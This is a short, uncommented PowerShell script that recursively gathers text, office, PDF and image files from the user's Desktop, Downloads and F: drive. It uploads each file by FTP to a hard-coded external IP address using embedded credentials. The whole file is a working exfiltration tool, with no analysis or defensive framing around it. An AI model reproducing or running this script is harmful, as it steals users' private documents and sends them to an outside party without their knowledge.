$WebClient = New-Object System.Net.WebClient
$Dir = "C:\Users\$env:username\desktop","C:\Users\$env:username\Downloads","F:\"
$FTP = "ftp://testadmin:testpassword@192.119.71.89/"


foreach($item in (Get-ChildItem $Dir -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.jpeg,*.jpg -Recurse)){
    $URI = New-Object System.Uri($FTP+$item.Name)
    $WebClient.UploadFile($URI, $item.FullName)
}